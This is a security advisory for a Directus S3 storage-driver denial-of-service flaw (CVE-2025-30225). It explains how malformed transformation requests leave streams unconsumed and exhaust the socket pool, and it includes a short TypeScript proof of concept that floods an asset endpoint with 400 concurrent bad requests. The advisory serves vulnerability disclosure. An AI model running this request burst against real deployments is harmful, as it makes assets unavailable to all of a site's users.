# [M] Directus's S3 assets become unavailable after a burst of malformed transformations

## Summary
Severity: Medium
Advisory: GHSA-j8xj-7jff-46mx
CVE: CVE-2025-30225
CWE: CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2025-03-26
Source: https://github.com/advisories/GHSA-j8xj-7jff-46mx
Type: github-advisory

## Affected
- npm: `@directus/storage-driver-s3` — affected >=9.22.0 <12.0.1
- npm: `directus` — affected >=9.22.0 <11.5.0

## Details
### Summary
When making many malformed transformation requests at once, at some point, all assets are being served as 403.

### Details
When I was investigating this issue, I have found that after a burst of malformed asset transformation requests, the amount of `sockets` held on [Agent on NodeHttpHandler](https://github.com/smithy-lang/smithy-typescript/blob/main/packages/node-http-handler/src/node-http-handler.ts#L189) was always equal to [`STORAGE_CLOUD_MAX_SOCKETS`](https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L89) making it impossible to have new connections causing assets to be inaccessible.

After looking into this [issue on AWS SDK](https://github.com/aws/aws-sdk-js-v3/issues/6691) I found that if the [stream is requested](https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L213), it needs to be consumed otherwise will hang forever. And as can be [seen here](https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L184) the stream is not consumed, because `sharp` will throw an error on the invalid arguments. For example `?height=xyz`

The [timeouts set here](https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L87-L88)  had no noticeable effect on tests made.

### PoC
This can be easily reproduced with the following steps:
- setup AWS S3 storage
- set STORAGE_CLOUD_MAX_SOCKETS: "50" (this value is lower than default for easier reproduction)
- upload a file to your project
- run this file (Replace the the file ID with the one you just uploaded):
```ts
import axios from "axios";

async function start() {
  Array.from({ length: 400 }, (_, i) => {
    axios
      .get(
        "http://localhost:8055/assets/e536aa35-3a81-4fa9-b856-3780584d38d8?width=100&height=XYZ"
      )
      .then(() => console.log("✅"))
      .catch((e) =>
        console.log("⛔", e.response?.status || e.code || e.message)
      );
  });
}

start();
```

Here's an example:



https://github.com/user-attachments/assets/7f5a6f51-1c51-4d4d-aa4f-c4953e91714c





### Impact
This causes denial of assets for all policies of Directus, including Admin and Public.

## References
- https://github.com/directus/directus/security/advisories/GHSA-j8xj-7jff-46mx
- https://nvd.nist.gov/vuln/detail/CVE-2025-30225
- https://github.com/directus/directus
